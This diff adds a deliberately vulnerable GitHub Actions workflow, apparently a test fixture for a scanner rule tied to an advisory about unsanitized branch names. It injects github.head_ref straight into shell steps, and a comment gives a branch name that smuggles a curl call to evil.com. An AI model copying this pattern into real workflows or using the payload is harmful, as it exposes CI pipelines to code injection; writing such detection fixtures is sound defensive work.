@@ -1,0 +1,35 @@
+# GHSA-8v8w-v8xg-79rf: Code injection via unsanitized branch names in tj-actions/branch-names
+# Advisory: https://github.com/advisories/GHSA-8v8w-v8xg-79rf
+# Vulnerability Type: Code Injection (CWE-94)
+# Expected Rule: CodeInjectionCriticalRule
+# Severity: Critical
+
+name: Vulnerable - Code Injection via Unsanitized Branch Names
+
+on:
+  pull_request_target:
+    types: [opened, synchronize]
+
+jobs:
+  process-branch-vulnerable:
+    runs-on: ubuntu-latest
+    permissions:
+      contents: read
+    steps:
+      - name: Process branch name (vulnerable pattern)
+        run: |
+          # Vulnerable: Direct substitution of github.head_ref in shell command
+          # An attacker can create a branch with name like: main`curl http://evil.com`
+          BRANCH_NAME=${{ github.head_ref }}
+          echo "Processing branch: $BRANCH_NAME"
+
+          # This command is vulnerable to injection
+          if [ "$BRANCH_NAME" != "" ]; then
+            echo "Branch validation passed"
+          fi
+
+      - name: Create tag from branch (vulnerable)
+        run: |
+          # Vulnerable: Using branch name directly in command
+          TAG_NAME="release-${{ github.head_ref }}"
+          echo "Would create tag: $TAG_NAME"
